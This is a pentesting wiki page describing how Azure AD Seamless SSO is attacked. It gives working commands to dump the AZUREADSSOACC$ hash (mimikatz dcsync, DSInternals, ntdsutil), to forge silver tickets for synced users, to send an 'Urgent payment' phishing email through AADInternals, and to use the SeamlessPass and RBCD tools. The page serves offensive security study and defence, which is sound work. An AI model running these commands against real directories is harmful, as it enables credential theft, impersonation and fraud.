# Az - Seamless SSO

{{#include ../../../../banners/hacktricks-training.md}}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso) Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) automatically **signs users in when they are on their corporate devices** connected to your corporate network. When enabled, **users don't need to type in their passwords to sign in to Azure AD**, and usually, even type in their usernames. This feature provides your users easy access to your cloud-based applications without needing any additional on-premises components.

<figure><img src="../../../../images/image (275).png" alt=""><figcaption><p><a href="https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works">https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/how-to-connect-sso-how-it-works</a></p></figcaption></figure>

Basically Azure AD Seamless SSO **signs users** in when they are **on a on-prem domain joined PC**.

It's supported by both [**PHS (Password Hash Sync)**](phs-password-hash-sync.md) and [**PTA (Pass-through Authentication)**](pta-pass-through-authentication.md).

Desktop SSO is using **Kerberos** for authentication. When configured, Azure AD Connect creates a **computer account called AZUREADSSOACC`$`** in on-prem AD. The password of the `AZUREADSSOACC$` account is **sent as plain-text to Azure AD** during the configuration.

The **Kerberos tickets** are **encrypted** using the **NTHash (MD4)** of the password and Azure AD is using the sent password to decrypt the tickets.

**Azure AD** exposes an **endpoint** (https://autologon.microsoftazuread-sso.com) that accepts Kerberos **tickets**. Domain-joined machine's browser forwards the tickets to this endpoint for SSO.

### On-prem -> cloud

The **password** of the user **`AZUREADSSOACC$` never changes**. Therefore, a domain admin could compromise the **hash of this account**, and then use it to **create silver tickets** to connect to Azure with **any on-prem user synced**:

```powershell
# Dump hash using mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:domain.local /dc:dc.domain.local"'
 mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit

# Dump hash using https://github.com/MichaelGrafnetter/DSInternals
Get-ADReplAccount -SamAccountName 'AZUREADSSOACC$' -Domain contoso -Server lon-dc1.contoso.local

# Dump using ntdsutil and DSInternals
## Dump NTDS.dit
ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q
## Extract password
Install-Module DSInternals
Import-Module DSInternals
$key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'
(Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hexos
```

With the hash you can now **generate silver tickets**:

```powershell
# Get users and SIDs
Get-AzureADUser | Select UserPrincipalName,OnPremisesSecurityIdentifier

# Create a silver ticket to connect to Azure with mimikatz
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin /sid:S-1-5-21-123456789-1234567890-123456789 /id:1105 /domain:domain.local /rc4:<azureadssoacc hash> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:12349e088b2c13d93833d0ce947676dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit

# Create silver ticket with AADInternal to access Exchange Online
$kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-854168551-3279074086-2022502410-1104" -Hash "097AB3CBED7B9DD6FE6C992024BC38F4"
$at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain company.com
## Send email
Send-AADIntOutlookMessage -AccessToken $at -Recipient "someone@company.com" -Subject "Urgent payment" -Message "<h1>Urgent!</h1><br>The following bill should be paid asap."
```

To utilize the silver ticket, the following steps should be executed:

1. **Initiate the Browser:** Mozilla Firefox should be launched.
2. **Configure the Browser:**
   - Navigate to **`about:config`**.
   - Set the preference for [network.negotiate-auth.trusted-uris](https://github.com/mozilla/policy-templates/blob/master/README.md#authentication) to the specified [values](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically):
     - `https://aadg.windows.net.nsatc.net`
     - `https://autologon.microsoftazuread-sso.com`
3. **Access the Web Application:**
   - Visit a web application that is integrated with the organization's AAD domain. A common example is [Office 365](https://portal.office.com/).
4. **Authentication Process:**
   - At the logon screen, the username should be entered, leaving the password field blank.
   - To proceed, press either TAB or ENTER.

> [!TIP]
> This doesn't bypass MFA if enabled

#### Option 2 without dcsync - SeamlessPass

It's also possible to perform this attack **without a dcsync attack** to be more stealth as [explained in this blog post](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/). For that you only need one of the following:

- **A compromised user's TGT:** Even if you don't have one but the user was compromised,you can get one using fake TGT delegation trick implemented in many tools such as [Kekeo](https://x.com/gentilkiwi/status/998219775485661184) and [Rubeus](https://posts.specterops.io/rubeus-now-with-more-kekeo-6f57d91079b9).
- **Golden Ticket**: If you have the KRBTGT key, you can create the TGT you need for the attacked user.
- **A compromised user’s NTLM hash or AES key:** SeamlessPass will communicate with the domain controller with this information to generate the TGT
- **AZUREADSSOACC$ account NTLM hash or AES key:** With this info and the user’s Security Identifier (SID) to attack it's possible to create a service ticket an authenticate with the cloud (as performed in the previous method).

Finally, with the TGT it's possible to use the tool [**SeamlessPass**](https://github.com/Malcrove/SeamlessPass) with:

```
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_TGT>
```

Further information to set Firefox to work with seamless SSO can be [**found in this blog post**](https://malcrove.com/seamlesspass-leveraging-kerberos-tickets-to-access-the-cloud/).

#### ~~Creating Kerberos tickets for cloud-only users~~ <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

If the Active Directory administrators have access to Azure AD Connect, they can **set SID for any cloud-user**. This way Kerberos **tickets** can be **created also for cloud-only users**. The only requirement is that the SID is a proper [SID](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778824(v=ws.10)>).

> [!CAUTION]
> Changing SID of cloud-only admin users is now **blocked by Microsoft**.\

### On-prem -> Cloud via Resource Based Constrained Delegation <a href="#creating-kerberos-tickets-for-cloud-only-users" id="creating-kerberos-tickets-for-cloud-only-users"></a>

Anyone that can manage computer accounts (`AZUREADSSOACC$`) in the container or OU this account is in, it can **configure a resource based constrained delegation over the account and access it**.

```python
python rbdel.py -u <workgroup>\\<user> -p <pass> <ip> azureadssosvc$
```
